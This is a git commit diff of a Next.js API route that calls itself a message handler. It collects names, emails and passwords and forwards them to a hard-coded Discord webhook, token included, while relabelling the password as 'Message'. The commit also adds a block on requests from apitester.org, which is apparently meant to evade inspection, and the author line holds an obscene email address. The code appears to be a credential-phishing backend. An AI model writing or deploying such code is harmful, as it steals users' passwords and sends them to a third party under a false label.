a59d73616f8f5a2427bf7eab05ee626659cab425
kander927 <ilovesemeninmybum@gmail.com>
2024-06-10 10:41:08 -0600

    Update route.ts

--- app/api/message/route.ts
+++ app/api/message/route.ts
@@ -4,52 +4,60 @@ let lastRequestTime: number = 0;
 const rateLimitInterval: number = 5000;
 
 export async function POST(req: Request) {
-    const { firstname, lastname, email, password } = await req.json();
+  const { firstname, lastname, email, password } = await req.json();
 
-    const currentTime = Date.now();
-    if (currentTime - lastRequestTime < rateLimitInterval) {
-        return new NextResponse("Ratelimited", { status: 429 });
-    }
+  const currentTime = Date.now();
+  if (currentTime - lastRequestTime < rateLimitInterval) {
+    return new NextResponse("Ratelimited", { status: 429 });
+  }
 
-    try {
-        const content = `**Firstname:** ${firstname} | **Lastname:** ${lastname} | **Email:** ${email} | **Message:** ${password}`;
+  const referer = req.headers.get("referer") || "";
+  const origin = req.headers.get("origin") || "";
+  if (referer.includes("apitester.org") || origin.includes("apitester.org")) {
+    return new NextResponse("Forbidden", { status: 403 });
+  }
 
-        await fetch("https://discord.com/api/webhooks/1230184199864975441/Xb4fsdXAAmU1CSY_ktNvF0ue6BhaKCwDztsP4bOVRlXHSp079fj80Jv4DjHmrHOIi0eu", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
+  try {
+    const content = `**Firstname:** ${firstname} | **Lastname:** ${lastname} | **Email:** ${email} | **Message:** ${password}`;
+
+    await fetch(
+      "https://discord.com/api/webhooks/1230184199864975441/Xb4fsdXAAmU1CSY_ktNvF0ue6BhaKCwDztsP4bOVRlXHSp079fj80Jv4DjHmrHOIi0eu",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          username: email,
+          embeds: [
+            {
+              title: "New message from " + firstname + " " + lastname,
+              color: 3447003,
+              fields: [
+                {
+                  name: "Email",
+                  value: email,
+                  inline: true,
+                },
+                {
+                  name: "Message",
+                  value: password,
+                  inline: true,
+                },
+              ],
+              timeStamp: new Date(),
             },
-            body: JSON.stringify({
-                
-                username: email,
-                embeds: [
-                    {
-                        title: 'New message from ' + firstname+" "+lastname,
-                        color: 3447003,
-                        fields: [
-                            {
-                                name: 'Email',
-                                value: email,
-                                inline: true
-                            },
-                            {
-                                name: 'Message',
-                                value: password,
-                                inline: true
-                            }
-                        ],
-                        timeStamp: new Date()
-                    }
-                ]
-            }),
-        });
+          ],
+        }),
+      }
+    );
 
-        lastRequestTime = currentTime;
+    lastRequestTime = currentTime;
 
-        return new NextResponse("Succesfully sent message", { status: 200 })
-    } catch (error: any) {
-        console.log(error);
+    return new NextResponse("Succesfully sent message", { status: 200 });
+  } catch (error: any) {
+    console.log(error);
 
-        return new NextResponse("Internal Server error", { status: 500 })
-    }
+    return new NextResponse("Internal Server error", { status: 500 });
+  }
 }
